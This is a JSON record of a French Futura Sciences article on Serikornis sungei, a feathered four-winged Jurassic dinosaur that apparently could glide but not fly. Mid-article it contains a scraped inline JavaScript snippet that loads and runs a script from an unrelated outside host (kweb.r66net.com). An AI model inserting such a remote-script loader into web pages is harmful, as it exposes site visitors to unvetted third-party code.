{"title": "Ce dinosaure a plumes avait quatre ailes mais ne volait pas", "newspaper": "Futura Sciences", "author": ["Jean-Luc Goudet"], "date_publi": "2017-09-02", "content": "Des paleontologues ont decrit une nouvelle espece de dinosaures. Selon ses decouvreurs, l'animal, qui avait pourtant quatre ailes, ne pouvait pas s'envoler mais peut-etre planer. Surtout, Silky (c'est son nom) nous raconte un chapitre de la longue histoire de la plume. Ses decouvreurs l'ont surnomme Silky parce que son plumage soyeux evoque cette race de poules, la poule soie en francais. L'animal vivait il y a 160 a 165 millions d'annees, en plein milieu du  Jurassique , dans ce qui est aujourd'hui le Liaoning, au nord de la Chine actuelle, une region ou ont deja ete exhumes des  dinosaures a plumes . Il mesurait 48 cm de longueur et etait couvert de plumes, jusque sur ses pattes arriere, ce qui en fait un animal a quatre ailes. C'etait un dinosaure  theropode , officiellement baptise  Serikornis sungei , et son plumage, bien conserve, vient d'etre decrit dans la revue  The Science of Nature  par une equipe internationale, essentiellement chinoise et belge. La decouverte est bien resumee dans  ce communique  de l'institut royal des Sciences naturelles de Belgique et renseigne sur l'histoire des plumes et celle du vol. La tete de  Serikornis sungei ,  alias  Silky. (c) Emily Willougby, CC by-sa 4.0                               La plume a precede le vol Les chercheurs notent l'absence de << barbules >>, ces petits crochets qui agrippent les plumes voisines et rigidifient le plumage. De plus, les  plumes  etaient symetriques, un defaut grave pour les paleontologues car il est dit que leur asymetrie est indispensable au vol, pour des raisons aerodynamiques. Le squelette a parle lui aussi, montrant l'absence de  sternum  developpe, sur lequel les oiseaux modernes attachent les puissants muscles des ailes, et une faiblesse structurelle des membres anterieurs.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Voir aussi : L'archeopteryx preferait planer plutot que voler Bref, Silky pouvait courir mais pas voler en battant des ailes. En revanche, il est possible qu'il ait ete capable de planer. Ses pattes se terminaient par des griffes lui permettant sans doute de grimper aux  arbres . De la a imaginer qu'il en redescendait en planant, par exemple pour fondre sur une proie, il n'y a qu'un pas, deja franchi par d'autres especes. Les paleontologues le suggerent par exemple pour l' archeopteryx  et l'anchiornis, deux  dinosaures  a plumes a peu pres contemporains de Silky (a l'echelle des temps geologiques). Voila qui montre une fois de plus que la plume a precede le vol, ayant servi d'abord de parure ou de  manteau . L'envol aurait donc eu lieu plus tard, au  Cretace , chez des  dinosaures  ressemblant peut-etre au  microraptor , avant qu'ils ne deviennent des oiseaux. ", "theme": "planete"}